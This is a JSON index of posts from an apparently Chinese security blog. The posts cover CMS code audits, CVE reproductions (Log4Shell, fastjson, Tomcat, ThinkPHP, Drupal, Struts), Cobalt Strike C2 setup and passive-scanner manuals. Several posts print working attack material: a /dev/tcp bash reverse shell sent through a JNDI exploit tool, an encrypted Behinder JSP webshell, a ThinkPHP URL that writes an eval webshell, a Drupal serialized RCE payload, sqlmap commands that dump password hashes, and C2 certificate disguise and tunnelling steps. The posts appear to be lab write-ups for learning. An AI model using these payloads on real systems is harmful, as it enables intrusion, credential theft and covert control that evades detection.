{"meta":{"title":"Alice01","subtitle":"","description":"","author":"Alice01","url":"http://example.com","root":"/"},"pages":[{"title":"404","date":"2024-11-25T08:45:00.000Z","updated":"2024-11-25T08:45:00.000Z","comments":true,"path":"404/index.html","permalink":"http://example.com/404/index.html","excerpt":"","text":""},{"title":"search","date":"2024-11-25T08:44:55.000Z","updated":"2024-11-25T08:44:55.000Z","comments":true,"path":"search/index.html","permalink":"http://example.com/search/index.html","excerpt":"","text":""}],"posts":[{"title":"xhcms审计复现","slug":"xhcms审计复现","date":"2025-08-11T10:21:32.000Z","updated":"2025-08-11T10:25:12.129Z","comments":true,"path":"2025/08/11/xhcms审计复现/","permalink":"http://example.com/2025/08/11/xhcms%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/","excerpt":"1.index.php(file存在文件包含，addslash无法防文件包含)函数addslash(单双引号反斜杠NULL前加\\) 语句$file&#x3D;addslashes($_GET[‘r’]); &#x2F;&#x2F;接收文件名$action&#x3D;$file&#x3D;&#x3D;’’?’index’:$file; &#x2F;&#x2F;判断为空或者等于indexinclude(‘files&#x2F;‘.$action.‘.php’); &#x2F;&#x2F;载入相应文件","text":"1.index.php(file存在文件包含，addslash无法防文件包含)函数addslash(单双引号反斜杠NULL前加\\) 语句$file&#x3D;addslashes($_GET[‘r’]); &#x2F;&#x2F;接收文件名$action&#x3D;$file&#x3D;&#x3D;’’?’index’:$file; &#x2F;&#x2F;判断为空或者等于indexinclude(‘files&#x2F;‘.$action.‘.php’); &#x2F;&#x2F;载入相应文件 2.inc&#x2F;checklogin.php(cookie伪造登录)语句&lt;?php$user&#x3D;$_COOKIE[‘user’];if ($user&#x3D;&#x3D;””){header(“Location: ?r&#x3D;login”);exit; }?&gt; 3.admin&#x2F;files&#x2F;wzlist.php(csrf-文章删除)语句$delete&#x3D;$_GET[‘delete’];if ($delete&lt;&gt;””){$query &#x3D; “DELETE FROM content WHERE id&#x3D;’$delete’”; 4.admin&#x2F;files&#x2F;editlink.php(id参数sql注入)语句$id&#x3D;$_GET[‘id’];$type&#x3D;$_GET[‘type’];if ($type&#x3D;&#x3D;1){$query &#x3D; “SELECT * FROM nav WHERE id&#x3D;’$id’”; 5.files&#x2F;download.php(id参数sql注入)语句$query &#x3D; “SELECT * FROM nav WHERE link&#x3D;’$llink’”; 6.admin&#x2F;files&#x2F;login.php(user参数存在sql注入)语句$user&#x3D;$_POST[‘user’];$query &#x3D; “SELECT * FROM manage WHERE user&#x3D;’$user’”; 7. file&#x2F;contact.php(xss)语句$page&#x3D;addslashes($_GET[‘page’]); &lt;?php **echo $page**?&gt; 8.files&#x2F;contents.php(多个xss)语句&lt;li&gt;昵称&lt;input name&#x3D;”name” type&#x3D;”text” value&#x3D;”&lt;?php **echo $_COOKIE[‘name’]**?&gt;” &#x2F;&gt;&lt;&#x2F;li&gt;&lt;li&gt;邮箱&lt;input name&#x3D;”mail” type&#x3D;”text” value&#x3D;”&lt;?php **echo $_COOKIE[‘mail’]**?&gt;”&#x2F;&gt;&lt;&#x2F;li&gt;&lt;li&gt;网址&lt;input name&#x3D;”url” type&#x3D;”text” value&#x3D;”&lt;?php **echo $_COOKIE[‘url’]**?&gt;”&#x2F;&gt;&lt;&#x2F;li&gt; 9.admin&#x2F;files&#x2F;commentlist.php(title参数xss)语句$fl_id&#x3D;$list[‘cid’];$query1 &#x3D; “SELECT * FROM $biao WHERE id&#x3D;’$fl_id’”;$resul1 &#x3D; mysql_query($query1) or die(‘SQL语句有误：’.mysql_error());$contentname &#x3D; mysql_fetch_array($resul1); &lt;td&gt;&lt;?php **echo $contentname [‘title’]**;?&gt;&lt;&#x2F;td&gt;","categories":[],"tags":[{"name":"审计","slug":"审计","permalink":"http://example.com/tags/%E5%AE%A1%E8%AE%A1/"}]},{"title":"bluecms审计复现","slug":"bluecms审计复现","date":"2025-08-11T08:13:37.000Z","updated":"2025-08-11T08:16:32.942Z","comments":true,"path":"2025/08/11/bluecms审计复现/","permalink":"http://example.com/2025/08/11/bluecms%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/","excerpt":"1.ad_js.php(ad_id存在sql注入因为拼接无单引号，可以绕过魔术引号转译)声明​ $ad_id &#x3D; !empty($_GET[‘ad_id’]) ? trim($_GET[‘ad_id’]) : ‘’; 语句​ $ad &#x3D; $db-&gt;getone(“SELECT * FROM “.table(‘ad’).” WHERE ad_id &#x3D;“.$ad_id);","text":"1.ad_js.php(ad_id存在sql注入因为拼接无单引号，可以绕过魔术引号转译)声明​ $ad_id &#x3D; !empty($_GET[‘ad_id’]) ? trim($_GET[‘ad_id’]) : ‘’; 语句​ $ad &#x3D; $db-&gt;getone(“SELECT * FROM “.table(‘ad’).” WHERE ad_id &#x3D;“.$ad_id); 2.article.php(act&#x3D;del时，id存在sql注入因为第一次未过滤) elseif($act &#x3D;&#x3D; ‘del’){ $article &#x3D; $db-&gt;getone(“SELECT cid, lit_pic FROM “.table(‘article’).” WHERE id&#x3D;”.$_GET[‘id’]); $sql &#x3D; “DELETE FROM “.table(‘article’).” WHERE id&#x3D;”.intval($_GET[‘id’]); $db-&gt;query($sql); if (file_exists(BLUE_ROOT.$article[‘lit_pic’])) { @unlink(BLUE_ROOT.$article[‘list_pic’]); } 3.common.fun.php(多处存在sql注入)函数getenv(搜索 name 所指向的环境字符串，并返回相关的值给字符串) 语句function getip(){ if (getenv(‘HTTP_CLIENT_IP’)) { $ip &#x3D; getenv(‘HTTP_CLIENT_IP’); } elseif (getenv(‘HTTP_X_FORWARDED_FOR’)) { &#x2F;&#x2F;????????????????????????????ip ??? $ip &#x3D; getenv(‘HTTP_X_FORWARDED_FOR’); } elseif (getenv(‘HTTP_X_FORWARDED’)) { $ip &#x3D; getenv(‘HTTP_X_FORWARDED’); } elseif (getenv(‘HTTP_FORWARDED_FOR’)) { $ip &#x3D; getenv(‘HTTP_FORWARDED_FOR’); } elseif (getenv(‘HTTP_FORWARDED’)) { $ip &#x3D; getenv(‘HTTP_FORWARDED’); } else { $ip &#x3D; $_SERVER[‘REMOTE_ADDR’]; } return $ip;} 4.admin&#x2F;tpl_manage.php(tpl_name存在任意文件读取&#x2F;修改)语句elseif($act &#x3D;&#x3D; ‘edit’){$file &#x3D; $_GET[‘tpl_name’];if(!$handle &#x3D; @fopen(BLUE_ROOT.’templates&#x2F;default&#x2F;‘.$file, ‘rb’)){ showmsg(‘打开目标模板文件失败’);}$tpl[‘content’] &#x3D; fread($handle, filesize(BLUE_ROOT.’templates&#x2F;default&#x2F;‘.$file));$tpl[‘content’] &#x3D; htmlentities($tpl[‘content’], ENT_QUOTES, GB2312);fclose($handle);$tpl[‘name’] &#x3D; $file;template_assign(array(‘current_act’, ‘tpl’), array(‘编辑模板’, $tpl));$smarty-&gt;display(‘tpl_info.htm’);}elseif($act &#x3D;&#x3D; ‘do_edit’){ $tpl_name &#x3D; !empty($_POST[‘tpl_name’]) ? trim($_POST[‘tpl_name’]) : ‘’; $tpl_content &#x3D; !empty($_POST[‘tpl_content’]) ? deep_stripslashes($_POST[‘tpl_content’]) : ‘’; if(empty($tpl_name)){ return false; } $tpl &#x3D; BLUE_ROOT.’templates&#x2F;default&#x2F;‘.$tpl_name; if(!$handle &#x3D; @fopen($tpl, ‘wb’)){ showmsg(“打开目标模版文件 $tpl 失败”); } if(fwrite($handle, $tpl_content) &#x3D;&#x3D;&#x3D; false){ showmsg(‘写入目标 $tpl 失败’); } fclose($handle); showmsg(‘编辑模板成功’, ‘tpl_manage.php’);} 5.user.php(act&#x3D;pay，pay存在文件包含;act&#x3D;do_login，from存在文件包含)语句 elseif ($act &#x3D;&#x3D; ‘pay’){ include ‘data&#x2F;pay.cache.php’; $price &#x3D; $_POST[‘price’]; $id &#x3D; $_POST[‘id’]; $name &#x3D; $_POST[‘name’]; if (empty($_POST[‘pay’])) { showmsg(‘�Բ�����û��ѡ��֧����ʽ’); } include ‘include&#x2F;payment&#x2F;‘.$_POST[‘pay’].“&#x2F;index.php”; } elseif($act &#x3D;&#x3D; ‘do_login’){ $user_name &#x3D; !empty($_POST[‘user_name’]) ? trim($_POST[‘user_name’]) : ‘’; $pwd &#x3D; !empty($_POST[‘pwd’]) ? trim($_POST[‘pwd’]) : ‘’; $safecode &#x3D; !empty($_POST[‘safecode’]) ? trim($_POST[‘safecode’]) : ‘’; $useful_time &#x3D; intval($_POST[‘useful_time’]); $from &#x3D; !empty($from) ? base64_decode($from) : ‘user.php’; 6.user.php(email、msn等变量存在xss因为trim只过滤头尾空格)函数htmlspecialchars()[将特殊字符转换为 HTML 实体]trim()[去除头尾空格] mb_substr(“字符串”, 开始位, 结束位)[按开始-结束取字符串] function filter_data($str)[img src onerror或大小写或重写绕过xss] { ​ $str &#x3D; preg_replace(“&#x2F;&lt;(/?)(script|i?frame|meta|link)(\\s*)[^&lt;]*&gt;&#x2F;“, “”, $str); ​ return $str; } 语句elseif($act &#x3D;&#x3D; ‘edit_user_info’){ $user_id &#x3D; intval($_SESSION[‘user_id’]); if(empty($user_id)){ return false; } $birthday &#x3D; trim($_POST[‘birthday’]); $sex &#x3D; intval($_POST[‘sex’]); $email &#x3D; !empty($_POST[‘email’]) ? trim($_POST[‘email’]) : ‘’; $msn &#x3D; !empty($_POST[‘msn’]) ? trim($_POST[‘msn’]) : ‘’; $qq &#x3D; !empty($_POST[‘qq’]) ? trim($_POST[‘qq’]) : ‘’; $mobile_phone &#x3D; !empty($_POST[‘mobile_phone’]) ? trim($_POST[‘mobile_phone’]) : ‘’; $office_phone &#x3D; !empty($_POST[‘office_phone’]) ? trim($_POST[‘office_phone’]) : ‘’; $home_phone &#x3D; !empty($_POST[‘home_phone’]) ? trim($_POST[‘home_phone’]) : ‘’; $address &#x3D; !empty($_POST[‘address’]) ? htmlspecialchars($_POST[‘address’]) : ‘’; $content &#x3D; !empty($_POST[‘content’]) ? filter_data($_POST[‘content’]) : ‘’;$descript &#x3D; !empty($_POST[‘descript’]) ? mb_substr($_POST[‘descript’], 0, 90) : mb_substr(html2text($_POST[‘content’]),0, 90); 7.&#x2F;admin&#x2F;login.php(宽字节注入[数据库编码为gbk，且用preg_replace()把单引号转换成&#39;或自带函数addslashes()进行转义，易发生宽字节注入])数据处理require_once(dirname(__FILE__ ) . ‘&#x2F;include&#x2F;common.inc.php’); &#x2F;include&#x2F;common.inc.php中二次包含mysql,class.php,跟进require_once(BLUE_ROOT.’include&#x2F;mysql.class.php’);mysql.class.php[数据库为gbk] function mysql($dbhost, $dbuser, $dbpw, $dbname &#x3D; ‘’, $dbcharset &#x3D; ‘gbk‘, $connect&#x3D;1){$func &#x3D; empty($connect) ? ‘mysql_pconnect’ : ‘mysql_connect’;if(!$this-&gt;linkid &#x3D; @$func($dbhost, $dbuser, $dbpw, true)){ $this-&gt;dbshow(‘Can not connect to Mysql!’);} else { if($this-&gt;dbversion() &gt; ‘4.1’){ mysql_query( “SET NAMES gbk“); if($this-&gt;dbversion() &gt; ‘5.0.1’){ mysql_query(“SET sql_mode &#x3D; ‘’”,$this-&gt;linkid); } 语句require_once(dirname(__FILE__) . ‘&#x2F;include&#x2F;common.inc.php‘);$act &#x3D; !empty($_REQUEST[‘act’]) ? trim($_REQUEST[‘act’]) : ‘login’;if($act &#x3D;&#x3D; ‘login’){ if($_SESSION[‘admin_id’]){ showmsg(‘您已登录，不用再次登录’, ‘index.php’); } template_assign(‘current_act’, ‘登录’); $smarty-&gt;display(‘login.htm’);}elseif($act &#x3D;&#x3D; ‘do_login’){ $admin_name &#x3D; isset($_POST[‘admin_name’]) ? trim($_POST[‘admin_name’]) : ‘’; $admin_pwd &#x3D; isset($_POST[‘admin_pwd’]) ? trim($_POST[‘admin_pwd’]) : ‘’; $remember &#x3D; isset($_POST) ? intval($_POST[‘rememberme’]) : 0;","categories":[],"tags":[{"name":"审计","slug":"审计","permalink":"http://example.com/tags/%E5%AE%A1%E8%AE%A1/"}]},{"title":"CVE-2021-44228","slug":"CVE-2021-44228","date":"2025-06-21T13:36:15.000Z","updated":"2025-06-21T13:56:53.182Z","comments":true,"path":"2025/06/21/CVE-2021-44228/","permalink":"http://example.com/2025/06/21/CVE-2021-44228/","excerpt":"1.漏洞简介1.1漏洞原理Log4j2 支持通过 ${} 语法调用Lookup 功能。攻击者可通过构造 jndi:ldap:&#x2F;&#x2F; 或 jndi:rmi:&#x2F;&#x2F; 的恶意字符串，触发 JNDI解析 1.2影响范围2.0 ≤ Apache Log4j2 &lt; 2.15.0-rc2 1.3漏洞探测${jndi:ldap:&#x2F;&#x2F;xxx.dnslog.cn} http://ip:port/solr/admin/collections?action=${jndi:ldap://xxx.dnslog.cn} 1.4漏洞利用","text":"1.漏洞简介1.1漏洞原理Log4j2 支持通过 ${} 语法调用Lookup 功能。攻击者可通过构造 jndi:ldap:&#x2F;&#x2F; 或 jndi:rmi:&#x2F;&#x2F; 的恶意字符串，触发 JNDI解析 1.2影响范围2.0 ≤ Apache Log4j2 &lt; 2.15.0-rc2 1.3漏洞探测${jndi:ldap:&#x2F;&#x2F;xxx.dnslog.cn} http://ip:port/solr/admin/collections?action=${jndi:ldap://xxx.dnslog.cn} 1.4漏洞利用 下载JNDI注入工具 https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar 监听端口 &#x2F;bin&#x2F;sh -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;4444 0&gt;&amp;1转为base64即为下命令base64的payloadjava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c “ {echo,base64的payload}|{base64,-d}|{bash,-i}” -A ip getshell 访问构造好JNDI注入的URL触发反弹 http://ip:port/solr/admin/collections?action=${jndi:ldap://ip:port/wzniav}","categories":[],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"CVE-2017-18349","slug":"CVE-2017-18349","date":"2025-06-21T13:35:51.000Z","updated":"2025-06-21T13:56:51.896Z","comments":true,"path":"2025/06/21/CVE-2017-18349/","permalink":"http://example.com/2025/06/21/CVE-2017-18349/","excerpt":"1.漏洞简介1.1漏洞原理fastjson存在AutoType功能，导致反序列化过程读取@type并调setter方法。可利用恶意json数据中的@type构造反序列化执行恶意代码。 1.2影响范围fastjson &lt; 1.2.25 1.3漏洞探测curl http://ip:端口/ -H “Content-Type: application&#x2F;json” –data ‘{“name”:”xx”, “age”:xx}’ curl后成功解析json 1.4漏洞利用","text":"1.漏洞简介1.1漏洞原理fastjson存在AutoType功能，导致反序列化过程读取@type并调setter方法。可利用恶意json数据中的@type构造反序列化执行恶意代码。 1.2影响范围fastjson &lt; 1.2.25 1.3漏洞探测curl http://ip:端口/ -H “Content-Type: application&#x2F;json” –data ‘{“name”:”xx”, “age”:xx}’ curl后成功解析json 1.4漏洞利用 编译工具与恶意类 https://github.com/mbechler/marshalsec.git 起文件服务并上传恶意类 访问触发getshell","categories":[],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"太阿平台漏洞复现","slug":"太阿平台漏洞复现","date":"2025-06-19T06:23:42.000Z","updated":"2025-06-22T04:05:58.932Z","comments":true,"path":"2025/06/19/太阿平台漏洞复现/","permalink":"http://example.com/2025/06/19/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","excerpt":"一、tomcat-pass-getshell1.访问&#x2F;manager登录 2.打包jspwebshell为war包 jar -cvf shell.war shell.jsp 3.上传war包&#x2F;shell&#x2F;shell.jsp为shell路径 4.getshell 二、tomcat 文件上传 (CVE-2017-12615)1.PUT方法探测 OPTIONS &#x2F;xx HTTP&#x2F;1.1 开启了put方法 2.put文件写入","text":"一、tomcat-pass-getshell1.访问&#x2F;manager登录 2.打包jspwebshell为war包 jar -cvf shell.war shell.jsp 3.上传war包&#x2F;shell&#x2F;shell.jsp为shell路径 4.getshell 二、tomcat 文件上传 (CVE-2017-12615)1.PUT方法探测 OPTIONS &#x2F;xx HTTP&#x2F;1.1 开启了put方法 2.put文件写入 文件头： PUT &#x2F;shell.jsp&#x2F; HTTP&#x2F;1.1 POST数据: &lt;%@page import&#x3D;”java.util.*,javax.crypto.*,javax.crypto.spec.*”%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals(“POST”)){String k&#x3D;”e45e329feb5d925b”;&#x2F;*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*&#x2F;session.putValue(“u”,k);Cipher c&#x3D;Cipher.getInstance(“AES”);c.init(2,new SecretKeySpec(k.getBytes(),”AES”));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%&gt; 3.getshell&#x2F;shell.jsp 三、shiro721代码执行&#x2F;shiro 反序列化 （CVE-2016-4437）1.爆钥链 2.命令执行 四、thinkphp 命令执行 （CVE-2018-1002015） &#x2F;thinkphp 代码执行 (CNVD-2018-24942)1.写webshell http://taie.hantaosec.com:9471/?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0\\]=file_put_contents&amp;vars[1][]=webshell.php&amp;vars[1][]=%3C?php%20eval($_GET[cmd]);?%3E) 2.getshell&#x2F;命令执行 http://taie.hantaosec.com:9471/webshell.php?cmd=system(%27ls%20/tmp%27); 五、struts2-046 远程代码执行 （CVE-2017-5638）&#x2F;struts2-052 远程代码执行 （CVE-2017-9805）1.验证 2.命令执行 3.文件上传 上传jsp到根目录后二次上传webshell 4.getshell 六、weblogic 反序列化（CVE-2020-2883）命令执行 七、dedecms文件上传（CVE-2019-8933）1.模版上传uploads&#x2F;dede 2.代码解析 3.getshell 八、seacms 远程命令执行 （CNVD-2020-22721）1.代码解析&#x2F;manager 允许ip随便写一个参数 抓包后ip参数加webshell 2.getshell 九、ucms 远程命令执行 （CVE-2020-25483）1.文件上传随便新增一个php 2.代码解析修改 保存 抓包，co参数替换为payload 3.getshell 十、maccms 远程命令执行（CVE-2017-17733）1.代码解析wd参数写木马c.php 密码c 2.getshell 十一、nostromo 远程命令执行 （CVE-2019-16278）1.代码执行验证包 POST &#x2F;.%0d.&#x2F;.%0d.&#x2F;.%0d.&#x2F;.%0d.&#x2F;bin&#x2F;sh HTTP&#x2F;1.0 Host: taie.hantaosec.com:36519 Content-Length: 26 echo echo ifconfig 2&gt;&amp;1 2.报错解决 换行问题,0d改00解决 十二、jupyter-notebook 命令执行 （CVE-2019-9644）命令执行teriminal直接执行系统命令 十三、Rails 代码注入（CVE-2020-8163）命令执行&#x2F;main&#x2F;index?IO.popen(%27ls%20&#x2F;tmp%27).read%0A%23 十四、drupal 代码执行 （CVE-2019-6340）代码执行 POST &#x2F;node&#x2F;?_format&#x3D;hal_json HTTP&#x2F;1.1Host: taie.hantaosec.com:63503User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko&#x2F;20100101 Firefox&#x2F;55.0Connection: keep-aliveContent-Type: application&#x2F;hal+jsonAccept: &#x2F;Cache-Control: no-cacheContent-Length: 645 { “link”: [ { “value”: “link”, “options”: “O:24:&quot;GuzzleHttp\\Psr7\\FnStream&quot;:2:{s:33:&quot;\\u0000GuzzleHttp\\Psr7\\FnStream\\u0000methods&quot;;a:1:{s:5:&quot;close&quot;;a:2:{i:0;O:23:&quot;GuzzleHttp\\HandlerStack&quot;:3:{s:32:&quot;\\u0000GuzzleHttp\\HandlerStack\\u0000handler&quot;;s:2:&quot;id&quot;;s:30:&quot;\\u0000GuzzleHttp\\HandlerStack\\u0000stack&quot;;a:1:{i:0;a:1:{i:0;s:6:&quot;system&quot;;}}s:31:&quot;\\u0000GuzzleHttp\\HandlerStack\\u0000cached&quot;;b:0;}i:1;s:7:&quot;resolve&quot;;}}s:9:&quot;_fn_close&quot;;a:2:{i:0;r:4;i:1;s:7:&quot;resolve&quot;;}}” } ], “_links”: { “type”: { “href”: “http://taie.hantaosec.com:63503/rest/type/shortcut/default“ } }} 改s长度与参数 十五、rails 任意文件读取 （CVE-2019-5418）文件读取&#x2F;chybeta accept头传payload ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;environ&#123;&#123; 十六、HMSv1.0SQL注入1.爆库 python3 sqlmap.py -u “http://taie.hantaosec.com:34150/doctorlogin.php“ –data&#x3D;”loginid&#x3D;admin&amp;password&#x3D;123456789&amp;rememberme&#x3D;on&amp;submit&#x3D;Login” –dbs 2.爆表 python3 sqlmap.py -u “http://taie.hantaosec.com:34150/doctorlogin.php“ –data&#x3D;”loginid&#x3D;admin&amp;password&#x3D;123456789&amp;rememberme&#x3D;on&amp;submit&#x3D;Login” -D mysql –tables 3.爆字段 python3 sqlmap.py -u “http://taie.hantaosec.com:34150/doctorlogin.php“ –data&#x3D;”loginid&#x3D;admin&amp;password&#x3D;123456789&amp;rememberme&#x3D;on&amp;submit&#x3D;Login” -D mysql -T user -columns 发现password后指定只爆password列 python3 sqlmap.py -u “http://taie.hantaosec.com:34150/doctorlogin.php“ –data&#x3D;”loginid&#x3D;admin&amp;password&#x3D;123456789&amp;rememberme&#x3D;on&amp;submit&#x3D;Login” -D mysql -T user -C password –dump 密码*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B 解密为root 4.数据库连接 5.后利用 拿到web管理权限 十七、DVWA命令执行impossible改low，尝试impossible失败 管道符绕过","categories":[],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"c2基建","slug":"c2基建","date":"2025-06-19T01:45:40.000Z","updated":"2025-07-05T07:34:18.341Z","comments":true,"path":"2025/06/19/c2基建/","permalink":"http://example.com/2025/06/19/c2%E5%9F%BA%E5%BB%BA/","excerpt":"1.Linxu上线genCrossC2.xxx 上传到服务端并chmod权限cna中修改第一个路径为绝对路径 加载crossc2插件 将服务端 .cobaltstrike.beacon_keys下载至客户端cs目录下（默认隐藏，需解除) crossc2仅支持https监听 客户端生成linuxpayload 上线 2.cs-msf派生 3.C2隐匿","text":"1.Linxu上线genCrossC2.xxx 上传到服务端并chmod权限cna中修改第一个路径为绝对路径 加载crossc2插件 将服务端 .cobaltstrike.beacon_keys下载至客户端cs目录下（默认隐藏，需解除) crossc2仅支持https监听 客户端生成linuxpayload 上线 2.cs-msf派生 3.C2隐匿 3.1修改默认端口3.2证书隐藏先查看cs证书 keytool -list -v -keystore cobaltstrike.store发现包含多条cs名称 生成伪装的新cs证书并查看特特征keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias 360.com -dname “CN&#x3D;US, OU&#x3D;360.com, O&#x3D;Sofaware, L&#x3D;Somewhere, ST&#x3D;Cyberspace, C&#x3D;CN” 替换旧证书 3.3cs_profileprofile编写 profile使用 3.4http跳板机重定向 4.端口转发配置好frp服务端和客户端,将客户端端口代理到服务端 通过代理端ip能访问到客户端服务 5.隧道上线5.1ICMP上线开两个监听，一个vps一个127 VPS开服务 sudo .&#x2F;pingtunnel -type server -noprint 1 -nolog 1 客户端转发流量 pingtunnel.exe -type client -l :9999 -s VPSIP -t VPSIP:PORT -tcp 1 -noprint 1 -nolog 1 ICMP上线 5.2DNS上线买个域名备案 释放DNS端口 ns记录后生成payload 上线","categories":[],"tags":[{"name":"红队基建","slug":"红队基建","permalink":"http://example.com/tags/%E7%BA%A2%E9%98%9F%E5%9F%BA%E5%BB%BA/"}]},{"title":"nvdmonitor","slug":"nvdmonitor","date":"2025-04-18T05:53:03.000Z","updated":"2025-04-18T10:40:41.220Z","comments":true,"path":"2025/04/18/nvdmonitor/","permalink":"http://example.com/2025/04/18/nvdmonitor/","excerpt":"nvdmonitor可以定时监控NVD漏洞库指定目标，并通过企业微信定时推送新增漏洞详情https://github.com/BugAlice01/nvdmonitorpip install -r requirements.txtconfig.yaml配置扫描的参数python nvdmonitor.py 单次扫描本日新增漏洞并推送到企微 python scheduler.py 每日定时扫描本日新增漏洞并推送到企微","text":"nvdmonitor可以定时监控NVD漏洞库指定目标，并通过企业微信定时推送新增漏洞详情https://github.com/BugAlice01/nvdmonitorpip install -r requirements.txtconfig.yaml配置扫描的参数python nvdmonitor.py 单次扫描本日新增漏洞并推送到企微 python scheduler.py 每日定时扫描本日新增漏洞并推送到企微 通过config.yaml修改扫描参数1.产品名称配置(NVD搜索的内容)querry: 2.扫描页数page: 1-5 3.任务名称target: 4.企微机器人推送配置(为空则不推送)wechat_bot: name: nvdmonitor webhook_url: “ “ 5.调度配置scheduler: mode: “fixed” # fixed 或 interval fixed模式配置 (每天固定时间执行) fixed_times: - “09:00” - “14:00” - “18:00” interval模式配置 (每隔几小时执行) interval_hours: 6 注意：企微推送有字数限制，如果消息过长则不能推送；通过任务日期json去重；扫描结果会存储在result","categories":[],"tags":[{"name":"工具","slug":"工具","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"EZ被动扫描-云端使用手册","slug":"EZ被动扫描-云端使用手册","date":"2025-03-28T08:15:52.000Z","updated":"2025-03-28T15:35:39.763Z","comments":true,"path":"2025/03/28/EZ被动扫描-云端使用手册/","permalink":"http://example.com/2025/03/28/EZ%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F-%E4%BA%91%E7%AB%AF%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/","excerpt":"1.ez安装与基础配置https://github.com/m-sec-org/EZ/releases/tag/1.8.9 选择操作系统对应的ez-zip文件并解压 下载ez证书 https://msec.nsfocus.com/ 登录-个人中心-申请证书-证书下载 将ez与ez证书放在同一个目录","text":"1.ez安装与基础配置https://github.com/m-sec-org/EZ/releases/tag/1.8.9 选择操作系统对应的ez-zip文件并解压 下载ez证书 https://msec.nsfocus.com/ 登录-个人中心-申请证书-证书下载 将ez与ez证书放在同一个目录 在该目录开启命令行，ez web端启动(如MAC命令为.&#x2F; ez的文件名 web) 访问http://127.0.0.1:8888 + &#x2F;bwheyansn(每次启动随机给出的路径) 初始密码为ez，首次访问需要重置密码 2.ezhelper安装与基础配置https://docs.ezreal.cool/public/ezhelper/v0.1/ez-helper.zip 下载解压，打开chrome浏览器-设置-插件-打开开发者模式 将解压的ez-helper拖进插件页面自动导入 插件管理处可将ez助手置顶在浏览器上方 3.ezhelper联动ez使用被动扫描启动服务端ez，进入ez web界面并输入修改后的密码，进入项目管理-随便添加一个项目 点击项目详情-复制项目Token 服务端保持服务，启动并使用客户端 在浏览器插件处点击ezhelper-选项配置 在Token处粘贴上项目Token EZ服务器地址:http://yourserver.ip:8888 [服务端ez地址+web端口] 白名单主机列表指定测试地址，避免未授权测试 访问测试站点 ezhelper-漏洞扫描(ezhelper颜色黑变黄表示已经开启被动扫描模式) 点击测试站点需要测试的接口ez自动测试该接口，测试结果会返回ezhelper-选项配置-漏洞管理","categories":[],"tags":[{"name":"工具SOP","slug":"工具SOP","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7SOP/"}]},{"title":"EZ被动扫描-本地使用手册","slug":"EZ被动扫描-本地使用手册","date":"2025-03-28T06:32:20.000Z","updated":"2025-03-28T15:34:41.517Z","comments":true,"path":"2025/03/28/EZ被动扫描-本地使用手册/","permalink":"http://example.com/2025/03/28/EZ%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F-%E6%9C%AC%E5%9C%B0%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/","excerpt":"​ 1.ez安装与基础配置https://github.com/m-sec-org/EZ/releases/tag/1.8.9 选择操作系统对应的ez-zip文件并解压 下载ez证书 https://msec.nsfocus.com/ 登录-个人中心-申请证书-证书下载 将ez与ez证书放在同一个目录","text":"​ 1.ez安装与基础配置https://github.com/m-sec-org/EZ/releases/tag/1.8.9 选择操作系统对应的ez-zip文件并解压 下载ez证书 https://msec.nsfocus.com/ 登录-个人中心-申请证书-证书下载 将ez与ez证书放在同一个目录 在该目录开启命令行，ez web端启动(如MAC命令为.&#x2F; ez的文件名 web) 访问http://127.0.0.1:8888 + &#x2F;bwheyansn(每次启动随机给出的路径) 初始密码为ez，首次访问需要重置密码 2.ezhelper安装与基础配置https://docs.ezreal.cool/public/ezhelper/v0.1/ez-helper.zip 下载解压，打开chrome浏览器-设置-插件-打开开发者模式 将解压的ez-helper拖进插件页面自动导入 插件管理处可将ez助手置顶在浏览器上方 3.ezhelper联动ez使用被动扫描启动ez，进入ez web界面并输入修改后的密码，进入项目管理-随便添加一个项目 点击项目详情-复制项目Token 在浏览器插件处点击ezhelper-选项配置 在Token处粘贴上项目Token EZ服务器地址:http://127.0.0.1:8888 [ez地址+web端口] 白名单主机列表指定测试地址，避免未授权测试 访问测试站点 ezhelper-漏洞扫描(ezhelper颜色黑变黄表示已经开启被动扫描模式) 点击测试站点需要测试的接口ez自动测试该接口，测试结果会返回ezweb端-指纹&#x2F;漏洞-项目Token的项目 4.越权被动扫描越权测试前，使用两个不同账号登录并分别获取Cookie，垂直越权测试时需以权限高的账户进行测试 F12-network-该页面路径-cookies 终端ez webscan –pocs over-pass-permission –headers1 “{&quot;Cookie&quot;: &quot;账户一cookie&quot;}” –headers2 “{&quot;Cookie&quot;: &quot;账户二cookie&quot;}” 终端被动扫描监听端口后开启对应端口代理代理 点击接口即可测试越权 